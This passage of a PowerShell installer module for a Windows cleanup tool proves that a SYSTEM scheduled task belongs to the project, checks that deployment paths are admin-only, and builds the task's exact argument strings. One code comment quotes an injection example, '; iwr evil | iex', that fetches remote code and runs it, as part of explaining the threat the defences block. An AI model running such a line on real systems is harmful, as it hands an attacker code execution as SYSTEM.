    # walking each item's parents would re-read the same handful of descriptors once per file. The
    # chains overlap under %ProgramFiles% on a default install, so findings and counts are collected
    # through sets and each path is reported at most once - the strict verdict wins, because it is
    # the stronger statement about the same path.
    #
    # The HOST binary's chain is proved HERE rather than beside Get-WacCanonicalPowerShellHost in
    # Core, deliberately: this function is the single gate the installer crosses immediately before
    # it registers the SYSTEM task, so one check here covers the only flow that ever hands a binary
    # to SYSTEM. The other callers of that function (Run.ps1's elevated relaunch, the uninstaller)
    # re-launch as the invoking ADMINISTRATOR, who can already rewrite any of those directories.
    #
    # A missing host is one more FINDING, not an early return. Returning here threw away every
    # untrusted path already collected and reported a CheckedCount that excluded them, so the
    # installer's loop over $trust.Untrusted printed nothing at all and the operator was told only
    # that something, somewhere, was wrong. Still fails closed - the entry is untrusted.
    $chains = New-Object 'System.Collections.Generic.List[string]'
    [void]$chains.Add($root)

    $taskHost = Get-WacCanonicalPowerShellHost
    if ($taskHost) {
        [void]$chains.Add($taskHost)
    }
    else {
        [void]$untrusted.Add([PSCustomObject]@{
            Path = '<PowerShell host>'
            Reason = 'No machine-trusted PowerShell host exists for the task to run.'
            Owner = $null
        })
    }

    foreach ($chain in $chains) {
        $chainTrust = Test-WacStatePathIsTrusted -Path $chain
        foreach ($probe in @($chainTrust.Checked)) { [void]$checkedSet.Add([string]$probe) }

        foreach ($failure in @($chainTrust.Failures)) {
            $path = [string]$failure.Path
            if (-not $reported.Add($path)) { continue }
            [void]$untrusted.Add([PSCustomObject]@{ Path = $path; Reason = [string]$failure.Reason; Owner = $null })
        }

        # A chain that answered nothing - an unresolvable path, an unready or non-fixed volume - is
        # not a pass. Test-WacStatePathIsTrusted reports those in Reason with no per-path failure,
        # so without this the walk would silently contribute zero findings.
        if (-not $chainTrust.IsTrusted -and @($chainTrust.Failures).Count -eq 0) {
            if ($reported.Add($chain)) {
                [void]$untrusted.Add([PSCustomObject]@{ Path = $chain; Reason = [string]$chainTrust.Reason; Owner = $null })
            }
        }
    }

    $checked = $checkedSet.Count
    $result.CheckedCount = $checked
    if ($untrusted.Count -gt 0) {
        $result.Untrusted = @($untrusted.ToArray())
        $result.Reason = ('{0} finding(s) against {1} checked paths: writable by a non-administrative principal, unreadable, or absent.' -f $untrusted.Count, $checked)
        return $result
    }

    $result.IsTrusted = $true
    $result.Reason = ('All {0} checked paths, ancestors up to the volume root included, are administrative only.' -f $checked)
    return $result
}

# ---------------------------------------------------------------------------------------------
# Scheduled-task identity
# ---------------------------------------------------------------------------------------------

function Test-WacTaskExecuteIsCanonicalHost {
    <#
    .SYNOPSIS
        True when a task action's Execute is one of the canonical machine-wide PowerShell hosts.
    .DESCRIPTION
        Ownership proof has to cover WHAT runs, not only which script it is pointed at. Accepting any
        rooted Execute means a task carrying our sentinel could run a user-writable binary as SYSTEM
        and still be judged "ours", which is the escalation the sentinel exists to prevent.
    #>
    param([Parameter(Mandatory = $true)][AllowEmptyString()][AllowNull()][string]$Execute)

    $normalized = Get-WacNormalizedPath -Path $Execute
    if (-not $normalized) { return $false }

    $canonical = New-Object 'System.Collections.Generic.List[string]'
    if ($env:ProgramFiles) {
        [void]$canonical.Add((Get-WacNormalizedPath -Path (Join-Path -Path $env:ProgramFiles -ChildPath 'PowerShell\7\pwsh.exe')))
    }
    [void]$canonical.Add((Get-WacNormalizedPath -Path (Join-Path -Path $env:SystemRoot -ChildPath 'System32\WindowsPowerShell\v1.0\powershell.exe')))

    foreach ($host51 in $canonical) {
        if ($host51 -and $normalized -ieq $host51) { return $true }
    }

    return $false
}

function Get-WacTaskScriptPath {
    <#
    .SYNOPSIS
        The normalised script path a task action runs, or $null.
    .DESCRIPTION
        Pure, so ownership proof can be asserted on directly instead of through a registered task.

        Two shapes have to be understood, and both matter:
          * `-Command "& '<path>' ..."` - what this version registers, because -File cannot carry a
            valued switch to Windows PowerShell 5.1 at all (see Core's Get-WacRelaunchArgument);
          * `-File <path>` - what versions before 1.2.0 registered. Still parsed so the legacy
            migration path can prove a pre-1.2 task belongs to this project before adopting it.
        Anything else returns $null, and ownership then fails closed.
    #>
    param([Parameter(Mandatory = $true)][AllowEmptyString()][AllowNull()][string]$Arguments)

    if ([string]::IsNullOrWhiteSpace($Arguments)) { return $null }

    # The -Command payload seeds $LASTEXITCODE, then calls the script with the call operator and a
    # single-quoted literal in which an embedded quote is doubled. Match the call operator wherever
    # it appears in the payload rather than assuming it comes first, so a future prologue statement
    # cannot silently break the ownership proof.
    $command = [regex]::Match($Arguments, "(?i)(?:^|\s)-Command\s+.*?&\s+'(?<path>(?:[^']|'')+)'")
    if ($command.Success) {
        return (Get-WacNormalizedPath -Path ($command.Groups['path'].Value -replace "''", "'"))
    }

    $file = [regex]::Match($Arguments, '(?i)(?:^|\s)-File\s+(?:"(?<quoted>[^"]+)"|(?<bare>[^\s"]+))')
    if (-not $file.Success) { return $null }

    $value = if ($file.Groups['quoted'].Success) { $file.Groups['quoted'].Value } else { $file.Groups['bare'].Value }
    return (Get-WacNormalizedPath -Path $value)
}

function Get-WacInstalledTask {
    <#
    .SYNOPSIS
        Returns the task registered at the canonical folder, and optionally the pre-1.2 task at the
        root folder.
    #>
    [CmdletBinding()]
    param([switch]$IncludeLegacy)

    $found = New-Object 'System.Collections.Generic.List[object]'

    $paths = New-Object 'System.Collections.Generic.List[string]'
    [void]$paths.Add($script:TaskFolder)
    if ($IncludeLegacy) { [void]$paths.Add('\') }

    foreach ($path in $paths) {
        try {
            $task = Get-ScheduledTask -TaskName $script:TaskName -TaskPath $path -ErrorAction Stop
        }
        catch {
            continue
        }
        if ($task) { [void]$found.Add($task) }
    }

    return @($found.ToArray())
}

function Get-WacTaskActionArgumentCandidate {
    <#
    .SYNOPSIS
        Every argument string this version can legitimately register for one deployed Run.ps1.
    .DESCRIPTION
        Ledger B2-3: "the arguments look about right" is not ownership proof. A permissive match
        accepts a trailing `; iwr evil | iex` inside the -Command payload, and the payload runs as
        SYSTEM. The only shape that cannot be talked around is the one this module GENERATES, so
        ownership compares the registered string ordinally against the complete set of strings
        Get-WacTaskActionArgument can produce for that script path - three independent switches,
        eight strings, no regex and therefore no regex hole.

        A task written by a FUTURE version whose action shape has changed will not match, and will
        be refused rather than silently replaced. That is the intended direction of the failure: the
        version that changes the shape adds its predecessor's generator here, in one place, instead
        of every reader loosening its matching.
    #>
    [CmdletBinding()]
    param([Parameter(Mandatory = $true)][string]$RunScript)

    $candidates = New-Object 'System.Collections.Generic.List[string]'
    foreach ($resetBase in @($true, $false)) {
        foreach ($prune in @($true, $false)) {
            foreach ($legacy in @($true, $false)) {
                [void]$candidates.Add((Get-WacTaskActionArgument -RunScript $RunScript `
                    -ResetWindowsUpdateBase $resetBase `
                    -PruneSupersededDrivers:$prune `
                    -EnableLegacyDiskCleanup:$legacy))
            }
        }
    }

    return @($candidates.ToArray())
}

function Get-WacLegacyTaskScriptPath {
    <#
    .SYNOPSIS
        The Run.ps1 path a pre-1.2 task action runs, or $null when the string is not EXACTLY the
        shape the pre-1.2 installer wrote.
    .DESCRIPTION
        v1.0.0/v1.1.0 built the action as one interpolated literal:

            -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File "<script>" -Scheduled
            [ -ResetWindowsUpdateBase]

        The pattern is anchored at both ends, so nothing may precede or follow it. That is what the
        brief means by "no trailing command injection": a task whose arguments merely CONTAIN the old
        shape - with an extra `-Command "..."` bolted on, say - is not the old task and is refused,
        because unregistering it would be acting on something we did not identify.

        Note what is deliberately NOT required here: a canonical Execute. The pre-1.2 installer
        resolved its host with `Get-Command pwsh.exe`, so a real legacy task can and does point at a
        PATH-resolved portable PowerShell on a secondary drive. That is precisely the vulnerable
        registration this migration exists to REMOVE; demanding a canonical host would refuse it,
        leave it running, and register a second task beside it.
    #>
    param([Parameter(Mandatory = $true)][AllowEmptyString()][AllowNull()][string]$Arguments)

    if ([string]::IsNullOrWhiteSpace($Arguments)) { return $null }

    $pattern = '^-NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File "(?<path>[^"]+)" -Scheduled( -ResetWindowsUpdateBase)?$'
    $match = [regex]::Match($Arguments.Trim(), $pattern)
    if (-not $match.Success) { return $null }

    $path = Get-WacNormalizedPath -Path $match.Groups['path'].Value
    if (-not $path) { return $null }
    if (-not ([System.IO.Path]::GetFileName($path) -ieq 'Run.ps1')) { return $null }
    return $path
}

function Test-WacTaskIsOurs {
    <#
    .SYNOPSIS
        Ownership proof. Nothing may overwrite or delete a task that does not pass this.
    .DESCRIPTION
        v1.1.0 registered with -Force and unregistered by name alone, so any unrelated task called
        WindowsAutoCleanup was silently replaced or deleted (ledger P0-4).

        CURRENT shape - every one of these, or the task is not ours (ledger B2-3):
          * exactly one action;
          * Execute is one of the canonical machine-wide PowerShell hosts, not merely rooted;
          * Arguments equal, ORDINALLY, one of the eight strings this version generates for
            <DeploymentRoot>\Run.ps1 - so a trailing statement in the -Command payload cannot pass;
          * WorkingDirectory, when the task carries one, is the deployment root;
          * the description carries the fixed sentinel.

        LEGACY shape - only with -AllowLegacyMigration, only at the ROOT task path, and only to
        REMOVE or REPLACE it, never to keep it: the exact pre-1.2 description plus an exactly parsed
        pre-1.2 action running a Run.ps1 with -Scheduled. Its Execute is intentionally unconstrained;
        see Get-WacLegacyTaskScriptPath.

        Anything else is refused with a reason, and the caller must leave that task alone.
    #>
    [CmdletBinding()]
    param(
        [Parameter(Mandatory = $true)]$Task,
        [string]$DeploymentRoot,
        [switch]$AllowLegacyMigration
    )

    $result = [PSCustomObject]@{
        TaskName = $null
        TaskPath = $null
        IsOurs = $false
        IsLegacy = $false
        ScriptPath = $null
        Reason = $null
    }

    if ([string]::IsNullOrWhiteSpace($DeploymentRoot)) { $DeploymentRoot = Get-WacDeploymentRoot }

    try { $result.TaskName = [string]$Task.TaskName } catch { $result.TaskName = $null }
    try { $result.TaskPath = [string]$Task.TaskPath } catch { $result.TaskPath = $null }

    $description = ''
    try { $description = [string]$Task.Description } catch { $description = '' }

    $actions = @()
    try { $actions = @($Task.Actions) } catch { $actions = @() }

    if ($actions.Count -ne 1) {
        $result.Reason = ('The task has {0} actions; ours has exactly one.' -f $actions.Count)
        return $result
    }

    $execute = ''
    $arguments = ''
    $workingDirectory = ''
    try { $execute = [string]$actions[0].Execute } catch { $execute = '' }
    try { $arguments = [string]$actions[0].Arguments } catch { $arguments = '' }
    # Absent on a stub and on some CIM shapes; an absent value cannot contradict the expectation, so
    # it is treated as "not stated" rather than as a mismatch.
    try { $workingDirectory = [string]$actions[0].WorkingDirectory } catch { $workingDirectory = '' }

    $carriesSentinel = ($description -and $description.Contains($script:TaskSentinel))

    if ($carriesSentinel) {
        # IsPathRooted alone accepts the drive-relative 'C:file' form, and normalisation alone
        # accepts a bare 'pwsh.exe' because GetFullPath resolves it against the current directory.
        $executeRooted = $false
        try { $executeRooted = [System.IO.Path]::IsPathRooted($execute) } catch { $executeRooted = $false }
        if (-not $executeRooted -or -not (Get-WacNormalizedPath -Path $execute)) {
            $result.Reason = 'The action executable is not a rooted local path.'
            return $result
        }

        # Rooted is not enough. Ownership has to cover WHAT runs, not only which script it points
        # at: a task carrying our sentinel but executing C:\Users\bob\evil.exe as SYSTEM would
        # otherwise be judged ours, adopted and left in place - the exact escalation the sentinel
        # exists to prevent.
        if (-not (Test-WacTaskExecuteIsCanonicalHost -Execute $execute)) {
            $result.Reason = ('The action executable {0} is not a canonical machine-wide PowerShell host.' -f $execute)
            return $result
        }

        $runScript = Join-Path -Path $DeploymentRoot -ChildPath 'Run.ps1'
        $matched = $false
        foreach ($candidate in (Get-WacTaskActionArgumentCandidate -RunScript $runScript)) {
            if ([string]::Equals($arguments, $candidate, [System.StringComparison]::Ordinal)) { $matched = $true; break }
        }
        if (-not $matched) {
            $result.Reason = ('The action arguments are not one this version registers for {0}.' -f $runScript)
            return $result
        }

        if ($workingDirectory) {
            $normalizedWorking = Get-WacNormalizedPath -Path $workingDirectory
            $normalizedRoot = Get-WacNormalizedPath -Path $DeploymentRoot
            if (-not $normalizedWorking -or -not $normalizedRoot -or ($normalizedWorking -ine $normalizedRoot)) {
                $result.Reason = ('The action working directory {0} is not the deployment root {1}.' -f $workingDirectory, $DeploymentRoot)
                return $result
            }
        }

        $result.IsOurs = $true
        $result.ScriptPath = (Get-WacNormalizedPath -Path $runScript)
        $result.Reason = 'The sentinel, the canonical host and the exact registered action all match.'
        return $result
    }

    if (-not $AllowLegacyMigration) {
        $result.Reason = 'The description does not carry the WindowsAutoCleanup ownership sentinel.'
        return $result
    }

    if ($result.TaskPath -and $result.TaskPath -ne '\') {
        $result.Reason = 'Only the pre-1.2 task at the root task path can be adopted.'
        return $result
    }
    if (-not $description -or -not $description.Contains($script:LegacyTaskDescription)) {
        $result.Reason = 'The description does not match the pre-1.2 WindowsAutoCleanup description.'
        return $result
    }

    $legacyScript = Get-WacLegacyTaskScriptPath -Arguments $arguments
    if (-not $legacyScript) {
        $result.Reason = 'The action arguments are not exactly the pre-1.2 -File Run.ps1 -Scheduled form.'
        return $result
    }

    $result.IsOurs = $true
    $result.IsLegacy = $true
    $result.ScriptPath = $legacyScript
    $result.Reason = ('Adopted the pre-1.2 task: old description text and an exactly parsed -Scheduled action running {0}.' -f $legacyScript)
    return $result
}

function Test-WacTaskReferencesRoot {
    <#
    .SYNOPSIS
        True when any of the given tasks would execute something inside the deployment root.
    .DESCRIPTION
        Ledger B2-3: the deployment files must survive if anything can still reach them. That
        includes a task the uninstaller REFUSED to touch - deleting the tree under a foreign task
        that happens to point into it turns "we left it alone" into "we broke it".

        Every place a path can hide in an action is looked at, not only the parsed script argument:
        the executable itself and the working directory are equally capable of naming the tree.
    #>
    [CmdletBinding()]
    param(
        [Parameter(Mandatory = $true)][AllowEmptyCollection()][AllowNull()][object[]]$Task,
        [Parameter(Mandatory = $true)][string]$DeploymentRoot
    )

    foreach ($entry in @($Task)) {
        if (-not $entry) { continue }

        $actions = @()
        try { $actions = @($entry.Actions) } catch { $actions = @() }

        foreach ($action in $actions) {
            if (-not $action) { continue }

            $arguments = ''
            $execute = ''
            $working = ''
            try { $arguments = [string]$action.Arguments } catch { $arguments = '' }
            try { $execute = [string]$action.Execute } catch { $execute = '' }
            try { $working = [string]$action.WorkingDirectory } catch { $working = '' }

            foreach ($candidate in @((Get-WacTaskScriptPath -Arguments $arguments), $execute, $working)) {
                if ([string]::IsNullOrWhiteSpace([string]$candidate)) { continue }
                $normalized = Get-WacNormalizedPath -Path ([string]$candidate)
                if (-not $normalized) { continue }
                if (Test-WacIsWithinRoot -ChildPath $normalized -RootPath $DeploymentRoot) { return $true }
            }
        }
    }

    return $false
}

function Remove-WacInstalledTask {
    <#
    .SYNOPSIS
        Unregisters a task that passes the ownership proof, then verifies it is really gone.
    #>
    [CmdletBinding()]
    param(
        [Parameter(Mandatory = $true)]$Task,
        [string]$DeploymentRoot,
        [switch]$AllowLegacyMigration
    )

    $proof = Test-WacTaskIsOurs -Task $Task -DeploymentRoot $DeploymentRoot -AllowLegacyMigration:$AllowLegacyMigration

    $result = [PSCustomObject]@{
        TaskName = $proof.TaskName
        TaskPath = $proof.TaskPath
        Removed = $false
        Verified = $false
        Reason = $proof.Reason
    }

    if (-not $proof.IsOurs) {
        Write-WacLog -Level WARNING -Component 'Deploy' -Message 'Refused to remove a task that is not ours.' -Data @{
            task = ('{0}{1}' -f $result.TaskPath, $result.TaskName); reason = $proof.Reason
        }
        return $result
    }

    try {
        Unregister-ScheduledTask -TaskName $result.TaskName -TaskPath $result.TaskPath -Confirm:$false -ErrorAction Stop
        $result.Removed = $true
    }
    catch {
        $result.Reason = $_.Exception.Message
        return $result
    }

    $still = $null
    try { $still = Get-ScheduledTask -TaskName $result.TaskName -TaskPath $result.TaskPath -ErrorAction Stop } catch { $still = $null }

    if ($still) {
        $result.Reason = 'Unregister-ScheduledTask reported success but the task is still registered.'
        Write-WacLog -Level ERROR -Component 'Deploy' -Message 'A task survived its own removal.' -Data @{ task = ('{0}{1}' -f $result.TaskPath, $result.TaskName) }
        return $result
    }

    $result.Verified = $true
    $result.Reason = 'Removed and verified absent.'
    Write-WacLog -Level INFO -Component 'Deploy' -Message 'Scheduled task removed.' -Data @{ task = ('{0}{1}' -f $result.TaskPath, $result.TaskName) }
    return $result
}

# ---------------------------------------------------------------------------------------------
# Argument vectors
# ---------------------------------------------------------------------------------------------

function Get-WacInstallerRelaunchArgument {
    <#
    .SYNOPSIS
        The child argument vector for the installer's elevated relaunch. Pure and order-stable.
    .DESCRIPTION
        Ledger P0-2: the old helper read its OWN empty $PSBoundParameters, so an explicit
        -ResetWindowsUpdateBase:$false never reached the elevated child and DISM ran /ResetBase.
        The caller snapshots the script's bound parameters and passes the effective VALUES here;
        ResetWindowsUpdateBase is always emitted in the explicit -Name:$true/$false form so the
        child's default can never re-apply.
    #>
    [CmdletBinding()]
    param(
        [Parameter(Mandatory = $true)][string]$ScriptPath,
        [Parameter(Mandatory = $true)][string]$DailyRunTime,
        [bool]$ResetWindowsUpdateBase = $true,
        [switch]$PruneSupersededDrivers,
        [switch]$EnableLegacyDiskCleanup,
        [switch]$NoPause
    )

    $present = New-Object 'System.Collections.Generic.List[string]'
    if ($PruneSupersededDrivers) { [void]$present.Add('PruneSupersededDrivers') }
    if ($EnableLegacyDiskCleanup) { [void]$present.Add('EnableLegacyDiskCleanup') }
    if ($NoPause) { [void]$present.Add('NoPause') }

    return (Get-WacRelaunchArgument -ScriptPath $ScriptPath `
        -BooleanSwitch @{ ResetWindowsUpdateBase = $ResetWindowsUpdateBase } `
        -PresentSwitch @($present.ToArray()) `
        -NamedValue @{ DailyRunTime = $DailyRunTime })
}

function Get-WacTaskActionArgument {
    <#
    .SYNOPSIS
        The argument STRING the scheduled task action runs. Pure, so the installer can assert that
        what it registered is what it read back.
    .DESCRIPTION
        -ResetWindowsUpdateBase is always explicit for the same reason as the relaunch vector: a
        missing switch would let Run.ps1's $true default enable DISM /ResetBase on a task the user
        installed with -ResetWindowsUpdateBase:$false.
    #>
    [CmdletBinding()]
    param(
        [Parameter(Mandatory = $true)][string]$RunScript,
        [bool]$ResetWindowsUpdateBase = $true,
        [switch]$PruneSupersededDrivers,
        [switch]$EnableLegacyDiskCleanup
    )

    $present = New-Object 'System.Collections.Generic.List[string]'
    [void]$present.Add('Scheduled')
    if ($PruneSupersededDrivers) { [void]$present.Add('PruneSupersededDrivers') }
    if ($EnableLegacyDiskCleanup) { [void]$present.Add('EnableLegacyDiskCleanup') }

    # Same builder as the elevated relaunch, and for the same reason: the task host is
    # powershell.exe whenever PowerShell 7 is absent, and -File cannot carry -Switch:$false to
    # Windows PowerShell 5.1 at all - the task would die during parameter binding.
    $arguments = Get-WacRelaunchArgument -ScriptPath $RunScript `
        -BooleanSwitch @{ ResetWindowsUpdateBase = [bool]$ResetWindowsUpdateBase } `
        -PresentSwitch @($present.ToArray()) `
        -HostSwitch @('-NonInteractive', '-WindowStyle', 'Hidden')

    return (ConvertTo-WacCommandLine -ArgumentList $arguments)
}

Export-ModuleMember -Function @(
    'Get-WacTaskName', 'Get-WacTaskFolder', 'Get-WacTaskSentinel', 'Get-WacTaskDescription',
    'Get-WacOperationLockName', 'Get-WacDeploymentVersion', 'Get-WacDeploymentProjectId',
    'Get-WacDeploymentManifestPath', 'New-WacDeploymentManifest', 'Read-WacDeploymentManifest',
    'Get-WacDeploymentFileHash', 'Get-WacDeploymentOwnership',
    'Test-WacIsExcludedDeploymentName', 'Get-WacDeploymentItem', 'Copy-WacDeploymentTree',
    'Get-WacDeploymentSlotPath', 'Install-WacDeployment', 'Remove-WacDeployment',
    'New-WacDeploymentStage', 'Switch-WacDeploymentStage',
    'Restore-WacDeploymentPrevious', 'Remove-WacDeploymentPrevious',
    'Test-WacDeploymentTrusted',
    'Get-WacTaskScriptPath', 'Get-WacLegacyTaskScriptPath', 'Test-WacTaskExecuteIsCanonicalHost',
    'Get-WacInstalledTask', 'Test-WacTaskIsOurs', 'Test-WacTaskReferencesRoot', 'Remove-WacInstalledTask',
    'Get-WacInstallerRelaunchArgument', 'Get-WacTaskActionArgument', 'Get-WacTaskActionArgumentCandidate'
)
